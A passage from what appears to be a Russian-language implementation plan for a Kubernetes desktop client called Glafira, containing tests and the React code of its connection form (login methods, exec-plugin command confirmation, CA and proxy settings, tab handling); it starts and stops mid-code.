    const user = userEvent.setup();
    renderWithClient(<ConnectionForm initial={newProfile()} tabId="t" />);

    await user.type(screen.getByLabelText("Имя"), "dev");
    await user.type(screen.getByLabelText("Адрес API-сервера"), "https://api.dev:6443");
    await user.selectOptions(screen.getByLabelText("Способ входа"), "token");
    await user.type(screen.getByLabelText("Токен"), "sha256~abc");
    await user.type(screen.getByLabelText("Избранные проекты"), "team-a, team-b");
    await user.click(screen.getByRole("button", { name: "Проверить подключение" }));

    expect(api.testConnection).toHaveBeenCalledWith(
      expect.objectContaining({
        name: "dev",
        apiUrl: "https://api.dev:6443",
        auth: { method: "token" },
        favoriteNamespaces: ["team-a", "team-b"],
      }),
      { token: "sha256~abc", clientKey: null },
      false,
    );
    expect(await screen.findByText("TCP-соединение с 10.0.0.1:6443 установлено")).toBeInTheDocument();
    expect(screen.getByText("Вход:")).toBeInTheDocument();
    expect(screen.getByText("Кластер отклонил учётные данные: токен истёк или неверен")).toBeInTheDocument();
    expect(screen.getByText("401 Unauthorized")).toBeInTheDocument();
  });

  it("сохраняет и открывает вкладку подключения", async () => {
    const saved: ConnectionProfile = { ...newProfile(), id: "new-id", name: "dev", apiUrl: "https://api.dev:6443" };
    vi.mocked(api.saveConnection).mockResolvedValue(saved);
    useWorkspace.getState().open({ kind: "connection-form", connectionId: null });
    const user = userEvent.setup();
    renderWithClient(<ConnectionForm initial={newProfile()} tabId="connection-form:new" />);
    await user.type(screen.getByLabelText("Имя"), "dev");
    await user.click(screen.getByRole("button", { name: "Сохранить" }));
    await waitFor(() => expect(useWorkspace.getState().activeId).toBe("cluster:new-id"));
    expect(api.saveConnection).toHaveBeenCalledWith(
      expect.objectContaining({ auth: { method: "browser" } }),
      {
        token: null,
        clientKey: null,
      },
      false,
    );
    expect(useWorkspace.getState().tabs.map((t) => t.id)).toEqual(["cluster:new-id"]);
  });

  it("клиентский сертификат: поля сертификата и ключа, ключ уходит секретом", async () => {
    vi.mocked(api.testConnection).mockResolvedValue({ ok: true, steps: [] });
    const user = userEvent.setup();
    renderWithClient(<ConnectionForm initial={newProfile()} tabId="t" />);
    await user.selectOptions(screen.getByLabelText("Способ входа"), "clientCert");
    await user.type(screen.getByLabelText("Сертификат (PEM)"), "CERT");
    await user.type(screen.getByLabelText("Ключ (PEM)"), "KEY");
    await user.click(screen.getByRole("button", { name: "Проверить подключение" }));
    expect(api.testConnection).toHaveBeenCalledWith(
      expect.objectContaining({ auth: { method: "clientCert", certificatePem: "CERT" } }),
      {
        token: null,
        clientKey: "KEY",
      },
      false,
    );
    // Переключение на токен и обратно не теряет сертификат.
    await user.selectOptions(screen.getByLabelText("Способ входа"), "token");
    expect(screen.queryByLabelText("Сертификат (PEM)")).toBeNull();
    await user.selectOptions(screen.getByLabelText("Способ входа"), "clientCert");
    expect(screen.getByLabelText("Сертификат (PEM)")).toHaveValue("CERT");
  });

  it("CA: сертификаты PEM, предупреждение и запрет небезопасного режима политикой", async () => {
    const user = userEvent.setup();
    const { unmount } = renderWithClient(<ConnectionForm initial={newProfile()} tabId="t" />);
    await user.selectOptions(screen.getByLabelText("Доверенный CA"), "pem");
    expect(screen.getByLabelText("Сертификаты CA (PEM)")).toBeInTheDocument();
    await user.selectOptions(screen.getByLabelText("Доверенный CA"), "insecure");
    expect(screen.getByRole("alert")).toHaveTextContent("не будет проверяться");
    unmount();

    vi.mocked(api.getPolicyStatus).mockResolvedValue({ ...POLICY, allowInsecureTls: false });
    renderWithClient(<ConnectionForm initial={newProfile()} tabId="t" />);
    const option = await screen.findByRole("option", { name: "Не проверять (небезопасно)" });
    await waitFor(() => expect(option).toBeDisabled());
  });

  it("новое prod-подключение — только для чтения", async () => {
    const user = userEvent.setup();
    renderWithClient(<ConnectionForm initial={newProfile()} tabId="t" />);
    await user.selectOptions(screen.getByLabelText("Окружение"), "prod");
    expect(screen.getByLabelText("Только чтение")).toBeChecked();
  });

  const existing: ConnectionProfile = { ...newProfile(), id: "c1", name: "prod-1", auth: { method: "token" } };

  it("существующее подключение: пустой токен не меняется", async () => {
    vi.mocked(api.saveConnection).mockResolvedValue(existing);
    const user = userEvent.setup();
    renderWithClient(<ConnectionForm initial={existing} tabId="connection-form:c1" />);
    expect(screen.getByLabelText("Токен")).toHaveAttribute("placeholder", "оставьте пустым, чтобы не менять");
    await user.click(screen.getByRole("button", { name: "Сохранить" }));
    expect(api.saveConnection).toHaveBeenCalledWith(expect.objectContaining({ id: "c1" }), { token: null, clientKey: null }, false);
  });

  it("exec-плагин: «Найти», строка запуска и подтверждение перед проверкой", async () => {
    vi.mocked(api.resolveExecCommand).mockResolvedValue("/opt/homebrew/bin/kubelogin");
    vi.mocked(api.testConnection).mockResolvedValue({ ok: true, steps: [] });
    const user = userEvent.setup();
    renderWithClient(<ConnectionForm initial={newProfile()} tabId="t" />);
    await user.selectOptions(screen.getByLabelText("Способ входа"), "exec");
    await user.type(screen.getByLabelText("Команда"), "kubelogin");
    await user.click(screen.getByRole("button", { name: "Найти" }));
    await waitFor(() => expect(screen.getByLabelText("Команда")).toHaveValue("/opt/homebrew/bin/kubelogin"));
    expect(api.resolveExecCommand).toHaveBeenCalledWith("kubelogin");
    await user.type(screen.getByLabelText("Аргументы (по одному в строке)"), "get-token{Enter}--oidc-issuer-url=https://sso.corp");
    await user.type(screen.getByLabelText("Переменные окружения (ИМЯ=значение, по одной в строке)"), "OIDC_CLIENT_SECRET=s3cr3t");
    expect(screen.getByLabelText("Строка запуска")).toHaveTextContent(
      "OIDC_CLIENT_SECRET=•••• /opt/homebrew/bin/kubelogin get-token --oidc-issuer-url=https://sso.corp",
    );
    const test = screen.getByRole("button", { name: "Проверить подключение" });
    expect(test).toBeDisabled();
    await user.click(screen.getByLabelText("Разрешаю Glafira запускать эту команду"));
    await user.click(test);
    expect(api.testConnection).toHaveBeenCalledWith(
      expect.objectContaining({
        auth: expect.objectContaining({
          method: "exec",
          command: "/opt/homebrew/bin/kubelogin",
          args: ["get-token", "--oidc-issuer-url=https://sso.corp"],
          env: [{ name: "OIDC_CLIENT_SECRET", value: "s3cr3t" }],
        }),
      }),
      { token: null, clientKey: null },
      true,
    );
  });

  it("exec-плагин: подтверждённая строка не требует галочки, политика запрещает способ", async () => {
    const approved: ConnectionProfile = {
      ...newProfile(),
      id: "e1",
      name: "eks",
      auth: { method: "exec", command: "/usr/local/bin/aws", args: ["eks", "get-token"], env: [], apiVersion: "client.authentication.k8s.io/v1beta1", provideClusterInfo: false, approved: "fp" },
    };
    const user = userEvent.setup();
    const { unmount } = renderWithClient(<ConnectionForm initial={approved} tabId="t" />);
    expect(screen.getByText("Строка запуска подтверждена")).toBeInTheDocument();
    await user.type(screen.getByLabelText("Аргументы (по одному в строке)"), "{Enter}--region=eu-west-1");
    expect(screen.getByLabelText("Разрешаю Glafira запускать эту команду")).not.toBeChecked();
    unmount();

    vi.mocked(api.getPolicyStatus).mockResolvedValue({ ...POLICY, allowExecAuth: false });
    renderWithClient(<ConnectionForm initial={newProfile()} tabId="t" />);
    const option = await screen.findByRole("option", { name: "Exec-плагин" });
    await waitFor(() => expect(option).toBeDisabled());
  });

  it("удаление с подтверждением закрывает вкладки подключения", async () => {
    vi.mocked(api.deleteConnection).mockResolvedValue();
    useWorkspace.getState().open({ kind: "cluster", connectionId: "c1" });
    useWorkspace.getState().open({ kind: "connection-form", connectionId: "c1" });
    const user = userEvent.setup();
    renderWithClient(<ConnectionForm initial={existing} tabId="connection-form:c1" />);
    await user.click(screen.getByRole("button", { name: "Удалить" }));
    expect(screen.getByText("Удалить подключение «prod-1»?")).toBeInTheDocument();
    await user.click(screen.getByRole("button", { name: "Да, удалить" }));
    await waitFor(() => expect(api.deleteConnection).toHaveBeenCalledWith("c1"));
    await waitFor(() => expect(useWorkspace.getState().tabs).toEqual([]));
  });

  it("ошибка сохранения показывается баннером", async () => {
    vi.mocked(api.saveConnection).mockRejectedValue({
      code: "INVALID_INPUT",
      key: "errors.connections.httpsRequired",
      message: "x",
      retryable: false,
    });
    const user = userEvent.setup();
    renderWithClient(<ConnectionForm initial={newProfile()} tabId="t" />);
    await user.click(screen.getByRole("button", { name: "Сохранить" }));
    expect(await screen.findByText("Адрес API-сервера должен начинаться с https:// и содержать хост")).toBeInTheDocument();
  });
});
````

<!-- block: file t14-src-components-connections-exec-test-ts step=14.2 path=src/components/connections/exec.test.ts -->
````ts
import { describe, expect, it } from "vitest";
import type { AuthConfig } from "../../api/types";
import { formatArgs, formatEnv, launchLine, needsExecConfirmation, newExec, parseArgs, parseEnv } from "./exec";

const exec = (patch: Partial<ReturnType<typeof newExec>> = {}): AuthConfig => ({
  method: "exec",
  ...newExec(),
  command: "/opt/homebrew/bin/kubelogin",
  args: ["get-token", "--oidc-issuer-url=https://sso.corp"],
  ...patch,
});

describe("exec", () => {
  it("аргументы и переменные — по строкам", () => {
    expect(parseArgs(" get-token \n\n--login=azurecli\n")).toEqual(["get-token", "--login=azurecli"]);
    expect(formatArgs(["a", "b"])).toBe("a\nb");
    expect(parseEnv("AWS_PROFILE=dev\nX=a=b\n\nEMPTY")).toEqual([
      { name: "AWS_PROFILE", value: "dev" },
      { name: "X", value: "a=b" },
      { name: "EMPTY", value: "" },
    ]);
    expect(formatEnv([{ name: "A", value: "1" }])).toBe("A=1");
  });

  it("строка запуска: секреты скрыты, аргументы с пробелами в кавычках", () => {
    const e = {
      ...newExec(),
      command: "/usr/local/bin/aws",
      args: ["eks", "get-token", "--cluster-name", "my cluster"],
      env: [
        { name: "AWS_PROFILE", value: "dev" },
        { name: "AWS_SECRET_ACCESS_KEY", value: "s3cr3t" },
      ],
    };
    expect(launchLine(e)).toBe("AWS_PROFILE=dev AWS_SECRET_ACCESS_KEY=•••• /usr/local/bin/aws eks get-token --cluster-name 'my cluster'");
  });

  it("подтверждение нужно для новой, изменённой и неподтверждённой строки", () => {
    const approved = exec({ approved: "fp" });
    expect(needsExecConfirmation({ method: "token" }, exec())).toBe(true);
    expect(needsExecConfirmation(exec(), exec())).toBe(true);
    expect(needsExecConfirmation(approved, exec())).toBe(false);
    expect(needsExecConfirmation(approved, exec({ args: ["get-token"] }))).toBe(true);
    expect(needsExecConfirmation(approved, { method: "token" })).toBe(false);
  });
});
````

<!-- block: file t14-src-components-connections-profile-test-ts step=14.2 path=src/components/connections/profile.test.ts -->
````ts
import { describe, expect, it } from "vitest";
import { formatNamespaces, newProfile, parseNamespaces, withAuthMethod, withCaMode, withProxyMode } from "./profile";

describe("profile", () => {
  it("новый профиль: вход через браузер, системный CA и прокси, dev", () => {
    const p = newProfile();
    expect(p.auth).toEqual({ method: "browser" });
    expect(p.ca).toEqual({ mode: "system" });
    expect(p.proxy).toEqual({ mode: "system" });
    expect(p.environment).toBe("dev");
    expect([p.requestTimeoutMs, p.connectTimeoutMs]).toEqual([30000, 10000]);
  });

  it("переключение способа входа, CA и прокси сохраняет введённое", () => {
    const cert = withAuthMethod({ method: "token" }, "clientCert", "PEM");
    expect(cert).toEqual({ method: "clientCert", certificatePem: "PEM" });
    expect(withAuthMethod(cert, "clientCert")).toEqual(cert);
    expect(withAuthMethod(cert, "token")).toEqual({ method: "token" });
    const exec = withAuthMethod(cert, "exec");
    expect(exec).toMatchObject({ method: "exec", command: "", args: [], apiVersion: "client.authentication.k8s.io/v1" });
    const last = { command: "/usr/local/bin/oc", args: ["get-token"], env: [], apiVersion: "v1", provideClusterInfo: false };
    expect(withAuthMethod({ method: "token" }, "exec", "", last)).toEqual({ method: "exec", ...last });
    expect(withCaMode({ mode: "system" }, "pem", "CA")).toEqual({ mode: "pem", pem: "CA" });
    expect(withCaMode({ mode: "pem", pem: "X" }, "insecure")).toEqual({ mode: "insecure" });
    expect(withProxyMode({ mode: "system" }, "url", "http://p:1")).toEqual({ mode: "url", url: "http://p:1" });
    expect(withProxyMode({ mode: "url", url: "u" }, "none")).toEqual({ mode: "none" });
  });

  it("проекты через запятую, пробелы и переводы строк", () => {
    expect(parseNamespaces(" team-a, team-b\nteam-a  ops ,")).toEqual(["team-a", "team-b", "ops"]);
    expect(parseNamespaces("")).toEqual([]);
    expect(formatNamespaces(["a", "b"])).toBe("a, b");
  });
});
````

<!-- block: file t14-src-state-workspace-test-ts step=14.2 path=src/state/workspace.test.ts -->
````ts
import { beforeEach, describe, expect, it } from "vitest";
import { tabId, useWorkspace } from "./workspace";

beforeEach(() => {
  useWorkspace.setState({ tabs: [], activeId: null });
});

describe("workspace", () => {
  it("повторное открытие активирует существующую вкладку", () => {
    const { open } = useWorkspace.getState();
    open({ kind: "cluster", connectionId: "c" });
    open({ kind: "settings" });
    open({ kind: "cluster", connectionId: "c" });
    const s = useWorkspace.getState();
    expect(s.tabs).toHaveLength(2);
    expect(s.activeId).toBe("cluster:c");
  });

  it("закрытие активной вкладки активирует соседнюю", () => {
    const { open, close, activate } = useWorkspace.getState();
    open({ kind: "cluster", connectionId: "a" });
    open({ kind: "cluster", connectionId: "b" });
    open({ kind: "cluster", connectionId: "c" });
    activate("cluster:b");
    close("cluster:b");
    expect(useWorkspace.getState().activeId).toBe("cluster:c");
    close("cluster:c");
    expect(useWorkspace.getState().activeId).toBe("cluster:a");
    close("cluster:a");
    expect(useWorkspace.getState().activeId).toBeNull();
  });

  it("id вкладок", () => {
    expect(tabId({ kind: "connection-form", connectionId: null })).toBe("connection-form:new");
    expect(tabId({ kind: "connection-form", connectionId: "c" })).toBe("connection-form:c");
    expect(tabId({ kind: "cluster", connectionId: "c" })).toBe("cluster:c");
    expect(tabId({ kind: "help", chapter: "connections" })).toBe("help");
  });

  it("closeForConnection закрывает все вкладки подключения", () => {
    const { open, activate, closeForConnection } = useWorkspace.getState();
    open({ kind: "cluster", connectionId: "a" });
    open({ kind: "cluster", connectionId: "b" });
    open({ kind: "connection-form", connectionId: "b" });
    open({ kind: "settings" });
    activate("connection-form:b");
    closeForConnection("b");
    const s = useWorkspace.getState();
    expect(s.tabs.map((t) => t.id)).toEqual(["cluster:a", "settings"]);
    expect(s.activeId).toBe("settings");
    closeForConnection("a");
    expect(useWorkspace.getState().tabs.map((t) => t.id)).toEqual(["settings"]);
  });

  it("повторное open обновляет spec открытой вкладки", () => {
    const { open } = useWorkspace.getState();
    open({ kind: "help", chapter: "getting-started" });
    open({ kind: "help", chapter: "connections", anchor: "kubeconfig" });
    const s = useWorkspace.getState();
    expect(s.tabs).toHaveLength(1);
    expect(s.tabs[0]).toMatchObject({ chapter: "connections", anchor: "kubeconfig" });
  });
});
````

Применить: `python3 /tmp/o1a-blocks.py step 14.2`.

- [ ] **Step 3: Увидеть падение.**

Run: `pnpm vitest run src/components/connections/ConnectionForm.test.tsx src/components/connections/exec.test.ts src/components/connections/profile.test.ts src/state/workspace.test.ts`
Expected: FAIL — нет модулей или компонентов, которые проверяют тесты.

- [ ] **Step 4: Реализация.**

<!-- block: file t14-src-components-connections-connectionform-tsx step=14.4 path=src/components/connections/ConnectionForm.tsx -->
````tsx
import { useMemo, useState } from "react";
import { useTranslation } from "react-i18next";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { api, toAppError } from "../../api/client";
import type { AppError, AuthConfig, AuthMethod, CaMode, ConnectionProfile, Environment, ExecAuth, ProxyMode, SecretsInput, TestReport } from "../../api/types";
import { tr } from "../../i18n/text";
import { useWorkspace } from "../../state/workspace";
import { ErrorBanner } from "../common/ErrorBanner";
import { Hint } from "../common/Hint";
import { formatArgs, formatEnv, launchLine, needsExecConfirmation, newExec, parseArgs, parseEnv } from "./exec";
import { formatNamespaces, parseNamespaces, withAuthMethod, withCaMode, withProxyMode } from "./profile";
import { folderPaths } from "./tree/folderTree";

const ENVIRONMENTS: Environment[] = ["local", "dev", "test", "stage", "prod"];
const AUTH_METHODS: AuthMethod[] = ["browser", "token", "clientCert", "exec"];
const CA_MODES: CaMode[] = ["system", "pem", "insecure"];
const PROXY_MODES: ProxyMode[] = ["system", "none", "url"];

export function ConnectionForm({ initial, tabId }: { initial: ConnectionProfile; tabId: string }) {
  const { t } = useTranslation();
  const [profile, setProfile] = useState(initial);
  // Секреты из формы: пустое поле — оставить сохранённый (у нового подключения его нет).
  const [token, setToken] = useState("");
  const [clientKey, setClientKey] = useState("");
  const [favorites, setFavorites] = useState(formatNamespaces(initial.favoriteNamespaces));
  const [manual, setManual] = useState(formatNamespaces(initial.manualNamespaces));
  // Последние введённые значения, чтобы переключение режима туда и обратно их не теряло.
  const [lastCert, setLastCert] = useState(initial.auth.method === "clientCert" ? initial.auth.certificatePem : "");
  const [lastCa, setLastCa] = useState(initial.ca.mode === "pem" ? initial.ca.pem : "");
  const [lastProxy, setLastProxy] = useState(initial.proxy.mode === "url" ? initial.proxy.url : "");
  // Exec-плагин: аргументы и переменные редактируются текстом, по строке на значение.
  const initialExec: ExecAuth = initial.auth.method === "exec" ? initial.auth : newExec();
  const [lastExec, setLastExec] = useState(initialExec);
  const [execArgs, setExecArgs] = useState(formatArgs(initialExec.args));
  const [execEnv, setExecEnv] = useState(formatEnv(initialExec.env));
  const [confirmExec, setConfirmExec] = useState(false);
  const [report, setReport] = useState<TestReport | null>(null);
  const [error, setError] = useState<AppError | null>(null);
  const [busy, setBusy] = useState(false);
  // Подтверждение удаления внутри формы: нативный window.confirm в Tauri 2 не показывается и возвращает false.
  const [confirmingDelete, setConfirmingDelete] = useState(false);
  const queryClient = useQueryClient();
  const foldersQ = useQuery({ queryKey: ["folders"], queryFn: api.listFolders });
  const policyQ = useQuery({ queryKey: ["policy"], queryFn: api.getPolicyStatus });
  const insecureForbidden = policyQ.data?.allowInsecureTls === false;
  const execForbidden = policyQ.data?.allowExecAuth === false;
  const paths = useMemo(() => folderPaths(foldersQ.data ?? []), [foldersQ.data]);
  // Ссылка на несуществующую папку означает корень (так её показывает и дерево).
  const knownFolder = (id: string | null | undefined): string | null =>
    !id || (foldersQ.isSuccess && !paths.some((p) => p.id === id)) ? null : id;
  // Папка, с которой форма открылась: перенос — только если пользователь сменил её в списке.
  const [loadedFolderId] = useState(initial.folderId);
  const [folderTouched, setFolderTouched] = useState(false);
  const folderId = knownFolder(folderTouched ? profile.folderId : initial.folderId);
  const open = useWorkspace((s) => s.open);
  const close = useWorkspace((s) => s.close);
  const closeForConnection = useWorkspace((s) => s.closeForConnection);
  const isNew = initial.id === "";
  const keepPlaceholder = isNew ? "" : t("connections.form.secretKeep");

  const update = (patch: Partial<ConnectionProfile>) => setProfile((p) => ({ ...p, ...patch }));
  const currentAuth = (): AuthConfig =>
    profile.auth.method === "exec" ? { ...profile.auth, args: parseArgs(execArgs), env: parseEnv(execEnv) } : profile.auth;
  const current = (): ConnectionProfile => ({
    ...profile,
    auth: currentAuth(),
    folderId,
    favoriteNamespaces: parseNamespaces(favorites),
    manualNamespaces: parseNamespaces(manual),
  });
  const secrets = (): SecretsInput => ({
    token: profile.auth.method === "token" && token.trim() ? token : null,
    clientKey: profile.auth.method === "clientCert" && clientKey.trim() ? clientKey : null,
  });
  // Строку запуска подтверждает человек: новая, изменённая или неподтверждённая требует галочки.
  const execNeedsConfirm = needsExecConfirmation(initial.auth, currentAuth());
  const execBlocked = profile.auth.method === "exec" && (execForbidden || (execNeedsConfirm && !confirmExec));

  async function run(fn: () => Promise<void>) {
    setBusy(true);
    setError(null);
    try {
      await fn();
    } catch (e) {
      setError(toAppError(e));
    } finally {
      setBusy(false);
    }
  }

  const onTest = () =>
    run(async () => {
      setReport(null);
      setReport(await api.testConnection(current(), secrets(), confirmExec));
    });

  const onSave = () =>
    run(async () => {
      const saved = await api.saveConnection(current(), secrets(), confirmExec);
      // save_connection не меняет место существующего подключения в дереве — перенос отдельной командой.
      try {
        if (!isNew && folderTouched && folderId !== knownFolder(loadedFolderId)) {
          await api.moveItems([{ kind: "connection", id: saved.id }], folderId, null);
        }
      } finally {
        // Настройки уже сохранены, даже если перенос не удался: список нужно обновить в любом случае.
        await queryClient.invalidateQueries({ queryKey: ["connections"] });
      }
      queryClient.removeQueries({ predicate: (q) => q.queryKey[1] === saved.id });
      close(tabId);
      open({ kind: "cluster", connectionId: saved.id });
    });

  const onDelete = () =>
    run(async () => {
      setConfirmingDelete(false);
      await api.deleteConnection(profile.id);
      await queryClient.invalidateQueries({ queryKey: ["connections"] });
      queryClient.removeQueries({ predicate: (q) => q.queryKey[1] === profile.id });
      closeForConnection(profile.id);
      close(tabId);
    });

  // Кнопка «Найти»: абсолютный путь к команде по PATH оболочки входа и стандартным каталогам.
  const onFind = () =>
    run(async () => {
      if (profile.auth.method !== "exec") return;
      const command = await api.resolveExecCommand(profile.auth.command);
      update({ auth: { ...profile.auth, command } });
    });

  const auth = profile.auth;
  const ca = profile.ca;
  const proxy = profile.proxy;

  return (
    <div className="page">
      <div className="toolbar">
        <h2>{isNew ? t("connections.form.titleNew") : t("connections.form.titleEdit", { name: initial.name })}</h2>
      </div>
      <div className="form">
        <label htmlFor="cf-name">{t("connections.form.name")}</label>
        <input id="cf-name" value={profile.name} onChange={(e) => update({ name: e.target.value })} />

        <label htmlFor="cf-folder">{t("connections.form.folder")}</label>
        <select
          id="cf-folder"
          value={folderId ?? ""}
          onChange={(e) => {
            setFolderTouched(true);
            update({ folderId: e.target.value || null });
          }}
        >
          <option value="">{t("connections.form.folderRoot")}</option>
          {paths.map((p) => (
            <option key={p.id} value={p.id}>
              {p.path.join(" / ")}
            </option>
          ))}
        </select>

        <span className="field-label">
          <label htmlFor="cf-env">{t("connections.form.environment")}</label>
          <Hint k="hints.connections.environment" label={t("connections.form.environment")} />
        </span>
        <select
          id="cf-env"
          value={profile.environment}
          onChange={(e) => {
            const environment = e.target.value as Environment;
            // Новое prod-подключение по умолчанию только для чтения; снять флажок можно сразу.
            update({ environment, readOnly: environment === "prod" && isNew ? true : profile.readOnly });
          }}
        >
          {ENVIRONMENTS.map((env) => (
            <option key={env} value={env}>
              {env}
            </option>
          ))}
        </select>

        <span className="field-label">
          <label htmlFor="cf-ro">{t("common.readOnly")}</label>
          <Hint k="hints.connections.readOnly" label={t("common.readOnly")} />
        </span>
        <span>
          <input id="cf-ro" type="checkbox" checked={profile.readOnly} onChange={(e) => update({ readOnly: e.target.checked })} />
        </span>

        <label htmlFor="cf-color">{t("connections.form.color")}</label>
        <input id="cf-color" type="color" value={profile.color} onChange={(e) => update({ color: e.target.value })} />

        <span className="field-label">
          <label htmlFor="cf-api">{t("connections.form.apiUrl")}</label>
          <Hint k="hints.connections.apiUrl" label={t("connections.form.apiUrl")} />
        </span>
        <input id="cf-api" placeholder="https://api.cluster.example.com:6443" value={profile.apiUrl} onChange={(e) => update({ apiUrl: e.target.value })} />

        <span className="field-label">
          <label htmlFor="cf-auth">{t("connections.form.authMethod")}</label>
          <Hint k="hints.connections.authMethod" label={t("connections.form.authMethod")} />
        </span>
        <select
          id="cf-auth"
          value={auth.method}
          onChange={(e) => {
            if (auth.method === "clientCert") setLastCert(auth.certificatePem);
            if (auth.method === "exec") setLastExec(currentAuth() as ExecAuth);
            update({ auth: withAuthMethod(auth, e.target.value as AuthMethod, lastCert, lastExec) });
          }}
        >
          {AUTH_METHODS.map((m) => (
            <option key={m} value={m} disabled={m === "exec" && execForbidden && auth.method !== "exec"}>
              {t(`connections.form.auth.${m}`)}
            </option>
          ))}
        </select>

        {auth.method === "browser" && <p className="muted full">{t("connections.form.browserNote")}</p>}

        {auth.method === "token" && (
          <>
            <span className="field-label">
              <label htmlFor="cf-token">{t("connections.form.token")}</label>
              <Hint k="hints.connections.token" label={t("connections.form.token")} />
            </span>
            <input id="cf-token" type="password" autoComplete="off" placeholder={keepPlaceholder} value={token} onChange={(e) => setToken(e.target.value)} />
          </>
        )}

        {auth.method === "clientCert" && (
          <>
            <span className="field-label">
              <label htmlFor="cf-cert">{t("connections.form.certificate")}</label>
              <Hint k="hints.connections.clientCert" label={t("connections.form.certificate")} />
            </span>
            <textarea
              id="cf-cert"
              rows={4}
              placeholder="-----BEGIN CERTIFICATE-----"
              value={auth.certificatePem}
              onChange={(e) => update({ auth: { method: "clientCert", certificatePem: e.target.value } })}
            />
            <label htmlFor="cf-key">{t("connections.form.clientKey")}</label>
            <textarea id="cf-key" rows={4} placeholder={keepPlaceholder || "-----BEGIN PRIVATE KEY-----"} value={clientKey} onChange={(e) => setClientKey(e.target.value)} />
          </>
        )}

        {auth.method === "exec" && (
          <>
            <span className="field-label">
              <label htmlFor="cf-exec-cmd">{t("connections.form.exec.command")}</label>
              <Hint k="hints.connections.exec" label={t("connections.form.exec.command")} />
            </span>
            <span className="toolbar">
              <input
                id="cf-exec-cmd"
                placeholder="/opt/homebrew/bin/kubelogin"
                value={auth.command}
                onChange={(e) => update({ auth: { ...auth, command: e.target.value } })}
              />
              <button type="button" disabled={busy || !auth.command.trim()} onClick={onFind}>
                {t("connections.form.exec.find")}
              </button>
            </span>
            <label htmlFor="cf-exec-args">{t("connections.form.exec.args")}</label>
            <textarea id="cf-exec-args" rows={3} placeholder="get-token" value={execArgs} onChange={(e) => setExecArgs(e.target.value)} />
            <label htmlFor="cf-exec-env">{t("connections.form.exec.env")}</label>
            <textarea id="cf-exec-env" rows={2} placeholder="AWS_PROFILE=dev" value={execEnv} onChange={(e) => setExecEnv(e.target.value)} />
            <span className="field-label">
              <span>{t("connections.form.exec.line")}</span>
              <Hint k="hints.connections.execLine" label={t("connections.form.exec.line")} />
            </span>
            <pre aria-label={t("connections.form.exec.line")}>{launchLine(currentAuth() as ExecAuth)}</pre>
            {execNeedsConfirm ? (
              <label className="inline full">
                <input type="checkbox" checked={confirmExec} disabled={execForbidden} onChange={(e) => setConfirmExec(e.target.checked)} />
                {t("connections.form.exec.confirm")}
              </label>
            ) : (
              <p className="muted full">{t("connections.form.exec.approved")}</p>
            )}
            {execForbidden && (
              <p className="warn full" role="alert">
                {t("connections.form.exec.forbidden")}
              </p>
            )}
          </>
        )}

        <span className="field-label">
          <label htmlFor="cf-ca">{t("connections.form.ca")}</label>
          <Hint k="hints.connections.ca" label={t("connections.form.ca")} />
        </span>
        <select
          id="cf-ca"
          value={ca.mode}
          onChange={(e) => {
            if (ca.mode === "pem") setLastCa(ca.pem);
            update({ ca: withCaMode(ca, e.target.value as CaMode, lastCa) });
          }}
        >
          {CA_MODES.map((m) => (
            <option key={m} value={m} disabled={m === "insecure" && insecureForbidden && ca.mode !== "insecure"}>
              {t(`connections.form.caMode.${m}`)}
            </option>
          ))}
        </select>
        {ca.mode === "pem" && (
          <textarea
            className="full"
            aria-label={t("connections.form.caPem")}
            rows={4}
            placeholder="-----BEGIN CERTIFICATE-----"
            value={ca.pem}
            onChange={(e) => update({ ca: { mode: "pem", pem: e.target.value } })}
          />
        )}
        {ca.mode === "insecure" && (
          <p className="warn full" role="alert">
            {insecureForbidden ? t("connections.form.insecureForbidden") : t("connections.form.insecureWarning")}
          </p>
        )}

        <span className="field-label">
          <label htmlFor="cf-sni">{t("connections.form.tlsServerName")}</label>
          <Hint k="hints.connections.tlsServerName" label={t("connections.form.tlsServerName")} />
        </span>
        <input id="cf-sni" value={profile.tlsServerName ?? ""} onChange={(e) => update({ tlsServerName: e.target.value || null })} />

        <span className="field-label">
          <label htmlFor="cf-proxy">{t("connections.form.proxy")}</label>
          <Hint k="hints.connections.proxy" label={t("connections.form.proxy")} />
        </span>
        <select
          id="cf-proxy"
          value={proxy.mode}
          onChange={(e) => {
            if (proxy.mode === "url") setLastProxy(proxy.url);
            update({ proxy: withProxyMode(proxy, e.target.value as ProxyMode, lastProxy) });
          }}
        >
          {PROXY_MODES.map((m) => (
            <option key={m} value={m}>
              {t(`connections.form.proxyMode.${m}`)}
            </option>
          ))}
        </select>
        {proxy.mode === "url" && (
          <input
            className="full"
            aria-label={t("connections.form.proxyUrl")}
            placeholder="http://proxy.example.com:3128"
            value={proxy.url}
            onChange={(e) => update({ proxy: { mode: "url", url: e.target.value } })}
          />
        )}

        <span className="field-label">
          <label htmlFor="cf-fav">{t("connections.form.favorites")}</label>
          <Hint k="hints.connections.favorites" label={t("connections.form.favorites")} />
        </span>
        <input id="cf-fav" placeholder="team-a, team-b" value={favorites} onChange={(e) => setFavorites(e.target.value)} />

        <span className="field-label">
          <label htmlFor="cf-manual">{t("connections.form.manualNamespaces")}</label>
          <Hint k="hints.connections.manualNamespaces" label={t("connections.form.manualNamespaces")} />
        </span>
        <input id="cf-manual" value={manual} onChange={(e) => setManual(e.target.value)} />

        <label htmlFor="cf-timeout">{t("connections.form.requestTimeout")}</label>
        <input
          id="cf-timeout"
          type="number"
          min={1000}
          step={1000}
          value={profile.requestTimeoutMs}
          onChange={(e) => update({ requestTimeoutMs: Number(e.target.value) })}
        />
        <label htmlFor="cf-connect">{t("connections.form.connectTimeout")}</label>
        <input
          id="cf-connect"
          type="number"
          min={1000}
          step={1000}
          value={profile.connectTimeoutMs}
          onChange={(e) => update({ connectTimeoutMs: Number(e.target.value) })}
        />
      </div>

      <div className="toolbar">
        <button type="button" disabled={busy || execBlocked} onClick={onTest}>
          {t("connections.form.test")}
        </button>
        <Hint k="hints.connections.test" label={t("connections.form.test")} />
        {busy && auth.method === "exec" && (
          // Плагин может ждать входа в браузере до 5 минут.
          <button type="button" onClick={() => void api.cancelOauthLogin(profile.id)}>
            {t("common.cancel")}
          </button>
        )}
        <button type="button" className="primary" disabled={busy} onClick={onSave}>
          {t("common.save")}
        </button>
        {!isNew &&
          (confirmingDelete ? (
            <span role="group" aria-label={t("connections.form.deleteGroup")}>
              <strong>{t("connections.form.deleteConfirm", { name: profile.name })}</strong>{" "}
              <button type="button" className="danger" disabled={busy} onClick={onDelete}>
                {t("connections.form.deleteYes")}
              </button>{" "}
              <button type="button" disabled={busy} onClick={() => setConfirmingDelete(false)}>
                {t("common.cancel")}
              </button>
            </span>
          ) : (
